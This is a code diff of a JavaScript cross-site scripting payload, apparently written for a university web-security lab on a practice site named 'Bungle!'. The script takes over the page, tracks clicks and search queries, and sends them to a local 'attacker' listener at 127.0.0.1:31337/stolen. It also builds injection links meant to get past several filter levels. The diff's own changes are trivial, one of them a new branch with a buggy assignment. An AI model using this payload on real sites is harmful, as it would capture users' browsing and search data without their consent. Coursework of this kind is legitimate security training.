@@ -43,8 +43,8 @@ function payload(attacker) {
             cache: false,
           }).done(function(){
               proxy("/project2");
-              var stateO = { data : "/project2" };
-              history.pushState(stateO, "Bungle!", "/project2");
+              var stateObj = { data : "/project2" };
+              history.pushState(stateObj, "Bungle!", "/project2");
             });
         });
         $( "#bungle-lnk" ).click(function(e) {
@@ -55,8 +55,8 @@ function payload(attacker) {
           }
           $.get( "http://127.0.0.1:31337/stolen", data);
           proxy("/project2");
-          var stateO = { data : "/project2" };
-          history.pushState(stateO, "Bungle!", "/project2");
+          var stateObj = { data : "/project2" };
+          history.pushState(stateObj, "Bungle!", "/project2");
         });
         $( "#search-btn" ).click(function(e) {
           e.preventDefault(); 
@@ -66,8 +66,8 @@ function payload(attacker) {
           }
           $.get( "http://127.0.0.1:31337/stolen", data);
               proxy("/project2/search?q=" + encodeURIComponent($('#query').val()));
-              var stateO = { data: '/project2/search?q=' + encodeURIComponent($('#query').val()) };
-              history.pushState(stateO, "Bungle!", "/project2/search?q=" + $('#query').val());
+              var stateObj = { data: '/project2/search?q=' + encodeURIComponent($('#query').val()) };
+              history.pushState(stateObj, "Bungle!", "/project2/search?q=" + $('#query').val());
         });
         $( "#search-again-btn" ).click(function(e) {
             data = { 'event' : 'nav', 'url' : encodeURIComponent(document.URL)}
@@ -77,15 +77,15 @@ function payload(attacker) {
             $.get("http://127.0.0.1:31337/stolen", data);
             e.preventDefault();
             proxy("/project2");
-            var stateO = { data : "/project2" };
-            history.pushState(stateO, "Bungle!", "/project2");
+            var stateObj = { data : "/project2" };
+            history.pushState(stateObj, "Bungle!", "/project2");
         });
     });
   }
   $("html").hide();
   proxy("./");
-  var stateO = { data: "/project2" };
-  history.pushState(stateO, "Bungle!", "/project2");
+  var stateObj = { data: "/project2" };
+  history.pushState(stateObj, "Bungle!", "/project2");
 }
 function makeLink(xssdefense, target, attacker) {
   if (xssdefense == 0) {
@@ -99,9 +99,11 @@ function makeLink(xssdefense, target, attacker) {
   } else if (xssdefense==2) {
     return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
     encodeURIComponent('<link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" media="screen"  onload="'+ payload.toString().replace(/"/g, "'") + ';payload(\'' + attacker + '\');"></link>');
+  } else if (xssdefense=3) {
   }
 }
 var attacker = "http://127.0.0.1:31337/";
 (function() {
   payload(attacker);
+  console.log('hello');
 })();
